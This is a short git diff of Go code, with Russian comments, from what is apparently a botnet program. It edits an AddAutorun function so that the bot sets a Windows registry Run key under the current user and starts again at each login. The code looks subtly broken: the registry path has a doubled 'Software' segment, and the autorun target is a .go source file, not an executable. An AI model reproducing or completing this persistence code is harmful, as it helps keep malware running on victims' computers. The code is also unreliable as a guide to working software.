@@ -13,9 +13,7 @@ func AddAutorun() {
 	if err != nil {                                      // Определение местонахождения программы
 		log.Fatal(err)                               //
 	}
-	fmt.Println(dir)
-	adress := dir
-	fmt.Println(adress)
+	adress := filepath.Join(dir, "botnet.go")            // Полный путь до программы
 	// Добавление ключа в реестр автозагрузок
 	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\Software\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
 	if err != nil {
